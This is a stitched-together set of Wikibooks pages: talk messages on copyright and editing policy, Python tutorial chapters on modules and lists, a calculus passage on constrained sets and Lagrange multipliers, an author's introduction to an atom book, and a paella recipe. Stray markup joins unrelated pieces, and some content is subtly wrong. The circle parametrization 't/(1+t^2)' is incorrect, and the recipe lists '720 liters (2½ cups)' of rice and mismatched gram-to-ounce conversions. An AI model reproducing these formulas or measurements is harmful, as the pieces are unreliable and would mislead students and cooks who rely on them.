It always makes me suspicious when I see an anonymous user post 300K of text with very few edits.  It usually means the editor is doing a cut and paste from a copyrighted resource, but it is possible that the author has written the text offline and ''then'' pasted it into Wikibooks.  I have been unable to find anything on the web that this may have been taken from, so I have taken no action other than to request clarification.

Where did this text come from?  Please understand that we cannot accept copyrighted materials here unless we have permission from the author(s). Please respond in the next couple of days, or this text may be deleted from Wikibooks. --[[User:Jomegat|Jomegat]] ([[User talk:Jomegat|talk]]) 13:22, 22 March 2009 (UTC)

== Who can Edit ==

Looking at some of the recent history of this work:
{|border=1 cellspacing=1 cellpadding=5
|-
|''This volume on Psychiatry is currently in the initial stages of development. Initial material has been sourced from Wikipedia. ''
|}

:In order for the GFDL to be properly respected (and therefore, for the inclusion of material licensed under the GFDL to be legal), we need to from know which Wikipedia articles this was drawn.  We can then do an edit history merge so that proper attribution can be made.

{|border=1 cellspacing=1 cellpadding=5
|-
|This volume on Psychiatry is currently in the initial stages of development. Contributions to date have, however, been made by experts in their fields (see below). Feel free to contact them with suggestions for change, but please do not make edits yourself. 
|}
This flies in the face of the policies we have here at Wikibooks.  The very first sentence of our [[Main page|front page]] says that &quot;anyone can edit&quot; the books developed here.  If you are not willing to allow others to make edits, you should probably look for a different wiki to host this material. 

--[[User:Jomegat|Jomegat]] ([[User talk:Jomegat|talk]]) 21:18, 23 March 2009 (UTC)

:I have to admit to being new at this.  However, my impression was that some of the textbooks do allow for assignment of authors.  What other wikis would be more appropriate to host this material? &lt;small&gt;—The preceding [[w:Wikipedia:Sign your posts on talk pages|unsigned]] comment was added by [[User:41.240.92.235|41.240.92.235]] ([[User talk:41.240.92.235|talk]] • [[Special:Contributions/41.240.92.235|contribs]]) .&lt;/small&gt;
::Part of what makes Wikibooks work is that ''anyone'' can edit any page (or as close to that as we can get). By restricting who can edit, you lose the whole point of a wiki. I'll simply remove the text noted above &amp; we will allow anyone to edit. &amp;nbsp;'''&amp;mdash;&amp;nbsp;[[User:Mike.lifeguard|&lt;b style=&quot;color:#309;&quot;&gt;Mike.lifeguard&lt;/b&gt;]]'''&amp;nbsp;&amp;#124;&amp;nbsp;&lt;sup&gt;[[User talk:Mike.lifeguard|&lt;span style=&quot;color:#309;&quot;&gt;talk&lt;/span&gt;]]&lt;/sup&gt; 22:10, 2 April 2009 (UTC)

:OK, fair enough.  Thank you, however, for retaining the author names.  I think this is important for several reasons.  First, readers, particularly practising clinicians, want to be assured of the expertise of the authors.  Second, writers, particularly those in academia, want some acknowledgement of their contributions.  It will be interesting so see the quality of future edits, and whether authors are happy with these.

== Need to split into chapters ==

This book desperately needs to be split into chapters.  If you need help doing this, don't hesitate to ask. --[[User:Jomegat|Jomegat]] ([[User talk:Jomegat|talk]]) 19:39, 31 March 2009 (UTC)

      <text xml:space="preserve">Here's this chapter's typing exercise (name it cal.py (&lt;code&gt;import&lt;/code&gt; actually looks for a file named calendar.py and reads it in.  If the file is named calendar.py and it sees a &quot;import calendar&quot; it tries to read in itself which works poorly at best.)):

&lt;source lang=&quot;python&quot;&gt;
import calendar
year = int(input(&quot;Type in the year number: &quot;))
calendar.prcal(year)
&lt;/source&gt;

And here is part of the output I got:

 Type in the year number: 2001
 
                                  2001

(I skipped some of the output, but I think you get the idea.) So what does the program do?  The first line &lt;code&gt;import calendar&lt;/code&gt; uses a new command &lt;code&gt;import&lt;/code&gt;.  The command &lt;code&gt;import&lt;/code&gt; loads a module (in this case the &lt;code&gt;calendar&lt;/code&gt; module).  To see the commands available in the standard modules either look in the library reference for python (if you downloaded it) or go to http://docs.python.org/library/.  If you look at the documentation for the calendar module, it lists a function called &lt;code&gt;prcal&lt;/code&gt; that prints a calendar for a year.  The line &lt;code&gt;calendar.prcal(year)&lt;/code&gt; uses this function.  In summary to use a module &lt;code&gt;import&lt;/code&gt; it and then use &lt;code&gt;module_name.function&lt;code&gt; for functions in the module.  Another way to write the program is:

&lt;source lang=&quot;python&quot;&gt;
from calendar import prcal

year = int(input(&quot;Type in the year number: &quot;))
prcal(year)
&lt;/source&gt; 

This version imports a specific function from a module.  Here is another program that uses the Python Library (name it something like clock.py) (press Ctrl and the 'c' key at the same time to terminate the program):

&lt;source lang=&quot;python&quot;&gt;
from time import time, ctime

prev_time = &quot;&quot;
while True:
    the_time = ctime(time())
    if prev_time != the_time:
        print(&quot;The time is:&quot;, ctime(time()))
        prev_time = the_time
&lt;/source&gt;

With some output being:

 The time is: Sun Aug 20 13:40:04 2000
 The time is: Sun Aug 20 13:40:05 2000
 The time is: Sun Aug 20 13:40:06 2000
 The time is: Sun Aug 20 13:40:07 2000
 
 Traceback (innermost last):
  File &quot;clock.py&quot;, line 5, in ?
     the_time = ctime(time())
 
 KeyboardInterrupt

The output is infinite of course so I canceled it (or the output at least continues until Ctrl+C is pressed).  The program just does a infinite loop (&lt;code&gt;True&lt;/code&gt; is always true, so &lt;code&gt;while True:&lt;/code&gt; goes forever) and each time checks to see if the time has changed and prints it if it has.  Notice how multiple names after the import statement are used in the line &lt;code&gt;from time import time, ctime&lt;/code&gt;.  

The Python Library contains many useful functions.  These functions give your programs more abilities and many of them can simplify programming in Python.

      <text xml:space="preserve">We have already seen lists and how they can be used.   Now that you have some more background I will go into more detail about lists.  First we will look at more ways to get at the elements in a list and then we will talk about copying them.  

Here are some examples of using indexing to access a single element of a list:

 &gt;&gt;&gt; '''some_numbers = ['zero', 'one', 'two', 'three', 'four', 'five']'''
 &gt;&gt;&gt; '''some_numbers[0]'''
 'zero'
 &gt;&gt;&gt; '''some_numbers[4]'''
 'four'
 &gt;&gt;&gt; '''some_numbers[5]'''
 'five'

All those examples should look familiar to you.  If you want the first item in the list just look at index 0.  The second item is index 1 and so on through the list.  However what if you want the last item in the list?  One way could be to use the &lt;code&gt;len()&lt;/code&gt; function like &lt;code&gt;some_numbers[len(some_numbers) - 1]&lt;/code&gt;.  This way works since the &lt;code&gt;len()&lt;/code&gt; function always returns the last index plus one.  The second from the last would then be &lt;code&gt;some_numbers[len(some_numbers) - 2]&lt;/code&gt;.  There is an easier way to do this.  In Python the last item is always index -1.  The second to the last is index -2 and so on.  Here are some more examples:

 &gt;&gt;&gt; '''some_numbers[len(some_numbers) - 1]'''
 'five'
 &gt;&gt;&gt; '''some_numbers[len(some_numbers) - 2]'''
 'four'
 &gt;&gt;&gt; '''some_numbers[-1]'''
 'five'
 &gt;&gt;&gt; '''some_numbers[-2]'''
 'four'
 &gt;&gt;&gt; '''some_numbers[-6]'''
 'zero'

Thus any item in the list can be indexed in two ways: from the front and from the back.

Another useful way to get into parts of lists is using slicing.  Here is another example to give you an idea what they can be used for:

 &gt;&gt;&gt; '''things = [0, 'Fred', 2, 'S.P.A.M.', 'Stocking', 42, &quot;Jack&quot;, &quot;Jill&quot;]'''
 &gt;&gt;&gt; '''things[0]'''
 0
 &gt;&gt;&gt; '''things[7]'''
 'Jill'
 &gt;&gt;&gt; '''things[0:8]'''
 [0, 'Fred', 2, 'S.P.A.M.', 'Stocking', 42, 'Jack', 'Jill']
 &gt;&gt;&gt; '''things[2:4]'''
 [2, 'S.P.A.M.']
 &gt;&gt;&gt; '''things[4:7]'''
 ['Stocking', 42, 'Jack']
 &gt;&gt;&gt; '''things[1:5]'''
 ['Fred', 2, 'S.P.A.M.', 'Stocking']

Slicing is used to return part of a list.  The slicing operator is in the form &lt;code&gt;things[first_index:last_index]&lt;/code&gt;.  Slicing cuts the list before the &lt;code&gt;first_index&lt;/code&gt; and before the &lt;code&gt;last_index&lt;/code&gt; and returns the parts in between.  You can use both types of indexing:

 &gt;&gt;&gt; '''things[-4:-2]'''
 ['Stocking', 42]
 &gt;&gt;&gt; '''things[-4]'''
 'Stocking'
 &gt;&gt;&gt; '''things[-4:6]'''
 ['Stocking', 42]

Another trick with slicing is the unspecified index.  If the first index is not specified the beginning of the list is assumed.  If the last index is not specified the whole rest of the list is assumed.  Here are some examples:

 &gt;&gt;&gt; '''things[:2]'''
 [0, 'Fred']
 &gt;&gt;&gt; '''things[-2:]'''
 ['Jack', 'Jill']
 &gt;&gt;&gt; '''things[:3]'''
 [0, 'Fred', 2]
 &gt;&gt;&gt; '''things[:-5]'''
 [0, 'Fred', 2]

Here is a (HTML inspired) program example (copy and paste in the poem definition if you want):
&lt;source lang=&quot;python&quot;&gt;
poem = [&quot;&lt;B&gt;&quot;, &quot;Jack&quot;, &quot;and&quot;, &quot;Jill&quot;, &quot;&lt;/B&gt;&quot;, &quot;went&quot;, &quot;up&quot;, &quot;the&quot;,
        &quot;hill&quot;, &quot;to&quot;, &quot;&lt;B&gt;&quot;, &quot;fetch&quot;, &quot;a&quot;, &quot;pail&quot;, &quot;of&quot;, &quot;&lt;/B&gt;&quot;,
        &quot;water.&quot;, &quot;Jack&quot;, &quot;fell&quot;, &quot;&lt;B&gt;&quot;, &quot;down&quot;, &quot;and&quot;, &quot;broke&quot;,
        &quot;&lt;/B&gt;&quot;, &quot;his&quot;, &quot;crown&quot;, &quot;and&quot;, &quot;&lt;B&gt;&quot;, &quot;Jill&quot;, &quot;came&quot;,
        &quot;&lt;/B&gt;&quot;, &quot;tumbling&quot;, &quot;after&quot;]

def get_bolds(text):
    true = 1
    false = 0
    ## is_bold tells whether or not we are currently looking at 
    ## a bold section of text.
    is_bold = false
    ## start_block is the index of the start of either an unbolded 
    ## segment of text or a bolded segment.
    start_block = 0
    for index in range(len(text)):
        ## Handle a starting of bold text
        if text[index] == &quot;&lt;B&gt;&quot;:
            if is_bold:
                print(&quot;Error: Extra Bold&quot;)
            ## print &quot;Not Bold:&quot;, text[start_block:index]
            is_bold = true
            start_block = index + 1
        ## Handle end of bold text
        ## Remember that the last number in a slice is the index 
        ## after the last index used.
        if text[index] == &quot;&lt;/B&gt;&quot;:
            if not is_bold:
                print(&quot;Error: Extra Close Bold&quot;)
            print(&quot;Bold [&quot;, start_block, &quot;:&quot;, index, &quot;]&quot;, text[start_block:index])
            is_bold = false
            start_block = index + 1

get_bolds(poem)
&lt;/source&gt;

with the output being:

 Bold [ 1 : 4 ] ['Jack', 'and', 'Jill']
 Bold [ 11 : 15 ] ['fetch', 'a', 'pail', 'of']
 Bold [ 20 : 23 ] ['down', 'and', 'broke']
 Bold [ 28 : 30 ] ['Jill', 'came']

The &lt;code&gt;get_bold()&lt;/code&gt; function takes in a list that is broken into words and tokens.  The tokens that it looks for are &lt;code&gt;&amp;lt;B&amp;gt;&lt;/code&gt; which starts the bold text and &lt;code&gt;&amp;lt;/B&amp;gt;&lt;/code&gt; which ends bold text. The function &lt;code&gt;get_bold()&lt;/code&gt; goes through and searches for the start and end tokens.

The next feature of lists is copying them.  If you try something simple like:

 &gt;&gt;&gt; '''a = [1, 2, 3]'''
 &gt;&gt;&gt; '''b = a'''
 &gt;&gt;&gt; '''print(b)'''
 [1, 2, 3]
 &gt;&gt;&gt; '''b[1] = 10'''
 &gt;&gt;&gt; '''print(b)'''
 [1, 10, 3]
 &gt;&gt;&gt; '''print(a)'''
 [1, 10, 3]

This probably looks surprising since a modification to &lt;code&gt;b&lt;/code&gt;
resulted in &lt;code&gt;a&lt;/code&gt; being changed as well.  What happened is that the
statement &lt;code&gt;b = a&lt;/code&gt; makes &lt;code&gt;b&lt;/code&gt; a ''reference'' to &lt;code&gt;a&lt;/code&gt;.
This means that &lt;code&gt;b&lt;/code&gt; can be thought of as another name for &lt;code&gt;a&lt;/code&gt;.
Hence any modification to &lt;code&gt;b&lt;/code&gt; changes &lt;code&gt;a&lt;/code&gt; as well.  However
some assignments don't create two names for one list:

 &gt;&gt;&gt; '''a = [1, 2, 3]'''
 &gt;&gt;&gt; '''b = a * 2'''
 &gt;&gt;&gt; '''print(a)'''
 [1, 2, 3]
 &gt;&gt;&gt; '''print(b)'''
 [1, 2, 3, 1, 2, 3]
 &gt;&gt;&gt; '''a[1] = 10'''
 &gt;&gt;&gt; '''print(a)'''
 [1, 10, 3]
 &gt;&gt;&gt; '''print(b)'''
 [1, 2, 3, 1, 2, 3]

In this case &lt;code&gt;b&lt;/code&gt; is not a reference to &lt;code&gt;a&lt;/code&gt; since the expression &lt;code&gt;a * 2&lt;/code&gt; creates a new list. Then the statement
&lt;code&gt;b = a * 2&lt;/code&gt; gives &lt;code&gt;b&lt;/code&gt; a reference to &lt;code&gt;a * 2&lt;/code&gt; rather than a reference to &lt;code&gt;a&lt;/code&gt;.  All assignment operations create a reference.
When you pass a list as an argument to a function you create a
reference as well.  Most of the time you don't have to worry about
creating references rather than copies.  However when you need to make
modifications to one list without changing another name of the list
you have to make sure that you have actually created a copy.

There are several ways to make a copy of a list.  The simplest that
works most of the time is the slice operator since it always makes a
new list even if it is a slice of a whole list:

 &gt;&gt;&gt; '''a = [1, 2, 3]'''
 &gt;&gt;&gt; '''b = a[:]'''
 &gt;&gt;&gt; '''b[1] = 10'''
 &gt;&gt;&gt; '''print(a)'''
 [1, 2, 3]
 &gt;&gt;&gt; '''print(b)'''
 [1, 10, 3]

Taking the slice &lt;code&gt;[:]&lt;/code&gt; creates a new copy of the list. However it only copies the outer list.  Any sublist inside is still a references to the sublist in the original list.  Therefore, when the list contains lists, the inner lists have to be copied as well.  You could do that manually but Python already contains a module to do it.  You use the &lt;code&gt;deepcopy&lt;/code&gt; function of the &lt;code&gt;copy&lt;/code&gt; module:

 &gt;&gt;&gt; '''import copy'''
 &gt;&gt;&gt; '''a = [[1, 2, 3], [4, 5, 6]]'''
 &gt;&gt;&gt; '''b = a[:]'''
 &gt;&gt;&gt; '''c = copy.deepcopy(a)'''
 &gt;&gt;&gt; '''b[0][1] = 10'''
 &gt;&gt;&gt; '''c[1][1] = 12'''
 &gt;&gt;&gt; '''print(a)'''
 [[1, 10, 3], [4, 5, 6]]
 &gt;&gt;&gt; '''print(b)'''
 [[1, 10, 3], [4, 5, 6]]
 &gt;&gt;&gt; '''print(c)'''
 [[1, 2, 3], [4, 12, 6]]

First of all notice that &lt;code&gt;a&lt;/code&gt; is a list of lists.  Then notice
that when &lt;code&gt;b[0][1] = 10&lt;/code&gt; is run both &lt;code&gt;a&lt;/code&gt; and &lt;code&gt;b&lt;/code&gt; are changed, but &lt;code&gt;c&lt;/code&gt; is not.  This happens because the inner arrays are still references when the slice operator is used.  However with &lt;code&gt;deepcopy&lt;/code&gt; &lt;code&gt;c&lt;/code&gt; was fully copied.

So, should I worry about references every time I use a function or
&lt;code&gt;=&lt;/code&gt;?  The good news is that you only have to worry about
references when using dictionaries and lists.  Numbers and strings
create references when assigned but every operation on numbers and
strings that modifies them creates a new copy so you can never modify
them unexpectedly.  You do have to think about references when you are
modifying a list or a dictionary.

By now you are probably wondering why are references used at all?  The
basic reason is speed.  It is much faster to make a reference to a
thousand element list than to copy all the elements.  The other reason
is that it allows you to have a function to modify the inputed list
or dictionary.  Just remember about references if you ever have some
weird problem with data being changed when it shouldn't be.

      <text xml:space="preserve">== Presentation ==
There are two main ways to present a subset of &lt;math&gt;\mathbf{R}^n&lt;/math&gt; – '''explicitly''' and '''implicitly.'''

An explicit presentation expresses a set as the ''image'' of a function, &lt;math&gt;X \to \mathbf{R}^n,&lt;/math&gt; most often the image of a function from another Euclidean space or cube, &lt;math&gt;\mathbf{R}^k \to \mathbf{R}^n&lt;/math&gt; or &lt;math&gt;[0,1]^k \to \mathbf{R}^n.&lt;/math&gt; This function can be interpreted as a vector-valued function with ''k'' inputs and ''n'' outputs.

An implicit presentation expresses a set as the ''pre-image'' of a function or functions, &lt;math&gt;\mathbf{R}^n \to Y,&lt;/math&gt; most often the pre-image of a function to another Euclidean space &lt;math&gt;\mathbf{R}^n \to \mathbf{R}^k,&lt;/math&gt; which can be interpreted as ''k'' separate real-valued functions (each with ''n'' inputs), or as a single vector-valued function in ''n'' inputs. Implicit presentations generally present subsets as ''[[w:level set|level set]]s'' or ''[[w:sublevel set|sublevel set]]s:'' via '''equalities''' or '''inequalities''' that elements of a subset must satisfy.

Briefly, explicit presentations ''list'' points, while implicit presentations ''test'' points: in an explicit presentation, as one ranges over the input, one obtains all the output, while in an implicit presentation, one can test possible points to see if they fall in the set: if the satisfy the constraints or not.

One can sometimes convert between these presentations, but in general this can be quite difficult.

=== Example: circle and disk ===
'''Circle:'''
* &lt;math&gt;x^2+y^2=1&lt;/math&gt; is an implicit presentation.
* &lt;math&gt;(\cos \theta, \sin \theta)&lt;/math&gt; for &lt;math&gt;\theta \in [0,1] \times [0,2\pi]&lt;/math&gt; is an explicit presentation.
* &lt;math&gt;\left(\frac{1-t^2}{1+t^2},\frac{t}{1+t^2}\right)&lt;/math&gt; for &lt;math&gt;t \in \mathbf{R}&lt;/math&gt; is an explicit presentation.

'''Disk:'''
* &lt;math&gt;x^2+y^2 \leq 1&lt;/math&gt; is an implicit presentation
* &lt;math&gt;(r \cos \theta, r \sin \theta)&lt;/math&gt; for &lt;math&gt;(r,\theta) \in [0,1] \times [0,2\pi]&lt;/math&gt; is an explicit presentation.
* &lt;math&gt;\left(u\frac{1-t^2}{1+t^2},u\frac{t}{1+t^2}\right)&lt;/math&gt; for &lt;math&gt;t \in \mathbf{R}, u \in [0,1]&lt;/math&gt; is an explicit presentation.

Different presentations may be more or less useful.

==== Caveats: Imperfect parametrizations ====
Note that explicit presentations sometimes hit the same point more than once (in the first presentation of the circle, &lt;math&gt;\theta = 0&lt;/math&gt; and &lt;math&gt;\theta = 2\pi&lt;/math&gt; map to the same point, and in the presentation of the disk, all points with &lt;math&gt;r=0&lt;/math&gt; map to the same point, the origin, &lt;math&gt;(0,0)&lt;/math&gt;), or miss a point (in the second presentation, the point &lt;math&gt;(-1,0)&lt;/math&gt; is not hit by any finite ''t'' – if one extends the domain to include &lt;math&gt;\infty,&lt;/math&gt; then it can be hit by some input). This is often simply a minor technicality to deal with, such as by excluding &lt;math&gt;\theta = 2\pi&lt;/math&gt; or including &lt;math&gt;t=\infty,&lt;/math&gt; or by checking points that are not hit or hit multiply separately and with care. The underlying mathematical issue is that the space being parametrized may not be [[w:homeomorphic|homeomorphic]] or [[w:diffeomorphic|diffeomorphic]] to the space being used to parameterize: one says that there is a &quot;[[w:topology|topological]] obstruction&quot; to giving a parametrization without these imperfections.

One need not in general concern oneself with the details of the topology, and topology is a major field of mathematics,
but, as with the [[w:boundedness principle|boundedness principle]] and the [[w:maximum principle|maximum principle]], topological theories underlie much of why calculus optimization methods work.

One topological, or more precisely geometric, observation that is worth mentioning, however, is that in many applications, the subset being considered is a [[w:convex set|convex set]] – it bulges out, not in, and, further, is connected (in one piece) and does not have holes in the middle. In these settings, the shape is topologically a disk or in higher dimensions a ''[[w:n-sphere|ball]],'' and one 
can thus talk about the interior of a shape (the ''open ''n''-ball''), and a single boundary, which will topologically be a simple sphere (the (&lt;math&gt;n-1&lt;/math&gt;)-sphere) rather than something more complicated. Thus there is little loss in generality of bearing the disk in mind as the archetypal example of a subset in thinking about these problems.

=== Explicit: parametrization ===
A set may be given explicitly by a parametrization, such as by a [[w:parametric equation|parametric equation]] in 1 parameter for a curve, or a [[w:parametric surface|parametric surface]] (parametric equation in 2 parameters).

=== Implicit: constraints ===
* Equality constraints
* Inequality constraints

== Discussion ==
When finding the extreme values of &lt;math&gt;f(x_1,x_2,\cdots, x_n)&lt;/math&gt; subject to a constraint &lt;math&gt;g(x_1,x_2,\cdots, x_n)=k&lt;/math&gt;, the stationary points found above will not work. This new problem can be thought of as finding extreme values of &lt;math&gt;f(x_1,x_2,\dots, x_n)&lt;/math&gt; when the point &lt;math&gt;(x_1,x_2,\dots, x_n) &lt;/math&gt; is restricted to lie on the surface &lt;math&gt; g(x_1,x_2,\dots, x_n)=k &lt;/math&gt;. The value of &lt;math&gt;f(x_1,x_2,\dots, x_n) &lt;/math&gt; is maximized(minimized) when the surfaces touch each other,''i.e'' , they have a common [[Tangent|tangent line]]. This means that the surfaces gradient vectors at that point are parallel, hence,

:  &lt;math&gt;\nabla f(x_1,x_2,\cdots, x_n) = \lambda \nabla g(x_1,x_2,\cdots, x_n) .&lt;/math&gt;

The number &lt;math&gt;\lambda &lt;/math&gt; in the equation is known as the Lagrange multiplier.

      <text xml:space="preserve">== Introduction: Pcfjr9 and A New Visualization of The Atom ==

Hi everyone. I wrote the WikiBook [[A_New_Model_of_the_Atom]] last year. It's A New Visualization of The Atom. A new way to view, teach, and understand the basics of atoms, and how they interact to form molecules. I didn't introduce myself earlier as I'm just now learning my way around Wiki. I am an electrical engineer by training and a Wannabe Renaissance Man by armchair. Originally from Northern Virginia, I moved to the Silicon Valley 25+ years ago to work and raise my family. My kids think my knowledge is like an ocean that covers the earth. But, I'll add that such a notion is a shallow ocean.
   
As my kids (they are twins) went through school they had a lot of trouble understanding the atom. They found my explanations made this difficult subject much more comprehensible than what they received in science class. Once I got my analogy of atomic theory into their heads, my children could “see” how pressure and heat can turn carbon to diamond, why the transformation increases carbon’s density, and why the diamond bonds are so strong. They can now understand the chemistry of why mayonnaise emulsifies oil with vinegar. I didn’t get that understanding from 8th grade science and chemistry, nor even high school. They were often far ahead of their classmates in many areas of middle and high school. From a class of 900, I like to think I had something to do with the payoff of watching them walk to the podium to receive awards at graduation. Their names were announced 21 times from the graduation program pamphlet. Now in college, they have told me that my explanations, on a multitude of subjects, have often placed them significantly ahead of classmates. They ask me to write a book, so this is its beginning.

[[A_New_Model_of_the_Atom]] is intended for intermediate and high school students (or any non-physicist adult) desiring a better understanding of atoms and how they create molecules. I welcome constructive criticism. Please let me know if parts are unclear or need expansion. If readers find this useful, I'll add more ways to understand some complex issues without math. I'd like to expand upon the duality of light and add some drawings to the &quot;Double-Slit&quot; experiment. Some other possible subjects include:
 
:&quot;How Neutrinos Can Travel Through a Wall of Lead One Light Year Thick&quot; 
:&quot;How a Teaspoon of Neutrons can Weigh 1 Billion Tons&quot;
:&quot;How Dark Matter and Dark Energy Could Give Shape to the Cosmos&quot;
:&quot;Why One Cannot Make an Electrical Generator Big Enough to Run an Electric Motor to Run the Generator&quot;

Please leave comments on the discussion page. Thanks &lt;&lt; [[User:Pcfjr9|Pcfjr9]] ([[User talk:Pcfjr9|talk]]) 21:41, 22 March 2009 (UTC)</text>

{{recipe}} | [[Cookbook:Cuisine of Spain|Cuisine of Spain]] | [[Cookbook:Rice Recipes|Rice Recipes]]

'''''Paella roja''''' is a classic version of mixed paella in Spain (not including the Valencian region). Paella aficionados refer to it as '''mixed''' because it combines meat from land animals with seafood. The recipe below is based on the one displayed on Spain-recipes.com&lt;ref&gt;[http://www.spain-recipes.com/red-paella.html Red paella recipe on Spain-recipes.com]&lt;/ref&gt; but with more ingredients. 

This lightly seasoned dish takes its name from sweet-roasted, red bell peppers and tomatoes. A chicken and seafood broth enhances this paella's flavors as well. 

''Paella roja'' requires some time to prepare but it's well worth the effort.

==Cleaning and eating mussels==
This recipe calls for live mussels. Please read [[cookbook:Bivalve Preparation|these safety guidelines]] for buying, eating and cooking live bivalves (mussels and clams).

==Equipment==
*A 38-centimeter (15-inch) ''paellera''
*A 7.6-liter (two-gallon) pot
*A rice skimmer
*A sharp chopping knife for meat and vegetables
*A large serving spoon
*A [[Cookbook:Potato Masher|potato masher]]
*A clean, white towel large enough to cover the ''paellera''
*A wide heating source such as:  
:#A stove large enough to accommodate the size of the ''paellera''
:#A [http://www.deliciasdeespana.com/store1/shopexd.asp?id=313 gas burner] designed specifically for ''paelleras'' 
:#A charcoal barbecue 
:#A low, forged steel tripod to support the ''paellera'' over a wood or charcoal fire
:#Cinder blocks or heat-resistant bricks to support the ''paellera'' over a wood or charcoal fire

==Recipe==
'''Please read ''[[cookbook:paella cooking techniques|Paella cooking techniques]]'' before attempting this recipe.'''
===Ingredients===
====Broth====
*225 grams (½ pound) [[cookbook:chicken|chicken]] wings
*225 grams (½ pound) of any of the following: frouncesen seafood mix; fish heads; whole [[cookbook:crab|crabs]]; [[cookbook:shrimp|shrimp]] heads;  [[wikipedia:smelt|smelts]]
*1 medium [[cookbook:onion|onion]]
*1 green [[cookbook:Bell Pepper|bell pepper]]
*3 [[cookbook:garlic|garlic cloves]]
*3.8 liters (1 gallon) of water
*2 [[Cookbook:Bay Leaf|bay leaves]]

====Paella====
*[[cookbook:Olive Oil|olive oil]]
*1½ to 2 red bell peppers cut into strips
*Salt to taste
*340 grams (12 ounces) boneless chicken breast or chicken tenderloins
*6 large garlic cloves, diced
*225 grams (8 ounces) onion, diced
*450 grams (1 pound) red bell pepper, diced
*1 pound [[cookbook:tomato|tomatoes]] diced
*1 tablespoon sweet [[cookbook:paprika|paprika]] 
*225 grams (6 ounces) of canned beans (optional), thoroughly rinsed and  strained; Use any of the following: [[cookbook:chickpea|chickpeas]]; [[cookbook:Butter Bean|butter beans]]; great northern beans; [[cookbook:Lima Bean|lima beans]]. ''Note: '''Never''' use stewed beans.''
*720 liters (2½ cups) Valencian [[cookbook:rice|rice]]
*1½ tablespoons food coloring for yellow rice; (See note below.)
*340 grams (12 ounces) [[cookbook:squid|squid]] mantles (diced or cut into rings), or 340 grams (12 ounces) [[cookbook:shrimp|shrimp]]
*340 grams (12 ounces) [[cookbook:scallop|scallops]]
*24 live [[cookbook:mussel|mussels]], cleaned with beards removed
''Note: Throughout history, [[cookbook:saffron|saffron]] has been the natural ingredient used in Spain to color rice yellow. However, it's very expensive (a pound costs over US$1,500) because it's labor intensive to process and each saffron [[Horticulture/Crocus|crocus]] yields a minuscule amount of saffron. Consequently, supermarkets sell only a few grams per container for three or four US dollars. The best solution to this problem is to use commercially manufactured food coloring containing both natural and artificial ingredients (but usually no saffron). The two most popular US brands are Bijol and Badia. These companies sell containers each holding several ounces of coloring for less than five US dollars.''

===Procedure===
====Broth====
#Fill a pan with about an inch of water. Bring to a slow boil and add the mussels. Cover the pan and wait about two minutes. Remove the open mussels. Continue checking for open mussels about once every minute. Throw out the ones that won’t open but SAVE THE WATER. Twist off the half shells without meat and discard. Put the half shells with meat in the fridge until you're ready to put them on the paella.
#Cut one onion and one bell pepper into quarters and place them in a large pot with the rest of the broth ingredients including the water from the previous step.
#Boil it down until you've got about a half gallon of broth. Occasionally press the ingredients against the bottom of the pot with the potato masher to squeeze out their flavors. 
#Strain the broth and set aside. Discard the boiled seafood and chicken wings. (If you don't like the idea of throwing out food then eat it as a snack but don't include it in the paella. At this point,  it has very little taste after all the boiling).
#Taste the broth. It should have a strong seafood flavor and moderate chicken flavor.

====Paella====
#Cut the red bell pepper into strips. 
#Pour a pool of oil into the center of the ''paellera''. The pool should be about two inches from the edge of the ''paellera'' on all sides. Heat over a high flame.
#Cook the pepper strips just long enough to scorch them. Remove them and set aside.
#Add one half tablespoon of salt to the chicken and [[cookbook:sautéing|sauté]] until golden brown.
#Add the garlic and sauté until it’s brown but be careful not to burn. This step should only take about a minute to 90 seconds.
#Add the tomatoes, paprika, onions and diced peppers. Sauté until all the vegetables are tender. You’ve just made Spanish ''[[cookbook:sofrito|sofrito]]''.
#Add 960 milliliters (four cups) of broth along with the food coloring and another half tablespoon of salt. Mix well.
#Bring the broth to a rolling boil then lower the heat a bit to allow the broth to [[Cookbook:simmering|simmer]] for about two minutes.
#Taste the broth and invite your dinner guests to do so as well. (This is a custom in Spain.) The broth should have a very lightly salted flavor.
#Add the rice and mix well. Once again, bring the broth to a rolling boil then reduce the heat to create a moderate simmer.
#Frequently mix the ingredients well to prevent burning. Begin tasting the rice after it's been simmering for about 20 minute and reduce the heat a bit. Make sure the rice doesn't get too soft. Check the rice again every 10 minutes and reduce the heat slightly after each taste. Your goal is to wind up with rice that has a slightly underdone center. The time it takes to reach this point can vary from 30 minutes to an hour depending on your cooking gear.
#Add the seafood (except for the mussels) along with the beans and cover it all with rice. Allow the paella to simmer for 10 more minutes. Don't mix the ingredients during this final phase.
#Your paella is done once you've accomplished the following three things: A) The rice should be slightly firm to the bite. Italians use the same approach when cooking pasta. They call this texture ''[[Cookbook:Al dente|al dente]]''. B) The paella should be a little moist but not soupy. C) You should have a bit of toasted rice on the bottom of the ''paellera''. This is considered a delicacy throughout the Spanish-speaking world. Once you've accomplished all of this, your paella is done.
#Remove the ''paellaera'' from the heat and cover it with a clean, white towel (NOT ALUMINUM FOIL). Then allow it to sit for five minutes. This will give the rice some time to absorb more water.
#Remove the towel and place the mussels around the edge of the ''paellera'' with the round edges facing down and push them down into the rice. (If your mussels have become very cold from sitting in the fridge then heat them in a microwave oven for no more than 30 seconds.) Arrange the pepper strips on top of the paella like spokes in a wheel. Your paella is now ready to serve.

Hi, could you explain why you would like the page you created [[Cookbook:Red paella (mixed)]] deleted please? I know it is a copy of another page you created, but that one has the wrong name and has been redirected to the one you are requesting to be deleted. Is your intention to remove this recipe, or just to tidy things up so there is only one copy? Can I presume [[Cookbook:Red chicken and seafood paella]] is the one you want to keep?
Thanks &lt;font color=&quot;#E66C2C&quot;&gt;[[User:QuiteUnusual|'''Unusual? Quite''']]&lt;/font&gt; &lt;sup&gt;&lt;font color=&quot;#306754&quot;&gt;[[User talk:QuiteUnusual|TalkQu]]&lt;/font&gt;&lt;/sup&gt; 22:45, 22 March 2009 (UTC)

:Ah, I see you have changed it to a redirect now - so no need for a deletion. Thanks. In future you would find it easier if you just moved the page to the new name you wanted.

Please don't spam user talk pages as you did with the notice about [[WB:RFP]] - that is considered extremely poor form. Those who care about the request will see it.

== Cookbook name casing ==

